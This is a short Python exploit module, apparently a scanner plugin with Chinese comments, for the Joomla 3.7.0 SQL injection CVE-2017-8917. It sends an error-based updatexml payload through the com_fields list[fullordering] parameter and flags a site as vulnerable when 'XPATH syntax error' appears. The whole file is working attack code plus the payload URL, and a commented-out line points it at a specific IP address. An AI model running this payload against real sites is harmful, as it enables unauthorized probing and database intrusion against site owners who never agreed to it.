'''
访问:
http://your-ip/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)
即可看到报错信息
'''
import requests
from termcolor import cprint

class Exploit:
    def attack(self, url):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"XPATH syntax error" in req.text:
                return "[+]存在Joomla 3.7.0 (CVE-2017-8917) SQL注入漏洞...(高危)\tpayload: "+vulnurl

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

#print(Exploit().attack("http://207.246.71.51"))